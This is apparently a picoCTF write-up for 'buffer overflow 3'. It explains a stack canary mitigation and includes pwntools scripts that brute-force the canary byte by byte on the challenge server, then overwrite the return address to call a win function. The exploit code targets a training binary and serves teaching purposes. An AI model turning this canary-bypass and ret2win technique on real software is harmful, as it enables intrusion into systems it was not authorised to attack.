### BUFFER OVERFLOW 3
---

This challenge does appear a mitigation called 'canary'. https://en.wikipedia.org/wiki/Buffer_overflow_protection
```
char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    fflush(stdout);
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}
```
Canary in this challenge is four bytes located at $ebp-0x10 as we can see. I created canary.txt containing ``` aaaa ```.
![image](https://github.com/user-attachments/assets/36dec827-0460-4b64-928e-db0c1a5b8d37)

If we solve it locally, it's really easy because we can control canary. But we have to connect to their server. This is our problem. According to hint, we'll bruteforce
every single canary char one by one.
```
#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4
void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count); // bof

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}


└─$ ./vuln
How Many Bytes will You Write Into the Buffer?
> 65
Input> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Ok... Now Where's the Flag?
```
We have 64 bytes offset until the program reaches canary.
Locally, we have canary is ``` b'aaaa' ```. When we type in 65 bytes 'a'. The last byte still matches the canary, that's why it prints out ``` Ok... Now Where's the Flag? ```.
Therefore, our approach is brute-force one character at a time. Then, concat it with canary until enough 4 bytes.
```
#!/usr/bin/python3

from pwn import *
import sys
import string

exe = ELF('./vuln', checksec=False)

# bruteforce canary

canary_off = 64

canary = b''
for i in range(1, 5):
	for c in string.printable:
		r = remote('saturn.picoctf.net',56046)


		r.sendlineafter(b'> ', str(canary_off + i).encode())

		payload = b'a'*canary_off + canary + c.encode()

		r.sendlineafter(b'Input> ', payload)
		output = r.recvall()

		if b"Ok... Now Where's the Flag?" in output: # found 1 character
			canary += c.encode()
			print(c)
			break
```

Finnaly, same as bof1 and bof2, we'll use ret2win technique to obtain our flag

```
p = remote('saturn.picoctf.net',56046)
payload = b'a'*canary_off + canary 
payload += b'a'*16 # after canary -> ebp
payload += p32(exe.sym['win'])

# pause()
p.sendlineafter(b'> ', str(len(payload)).encode())

# pause()
p.sendlineafter(b'Input> ', payload)
p.interactive()
```



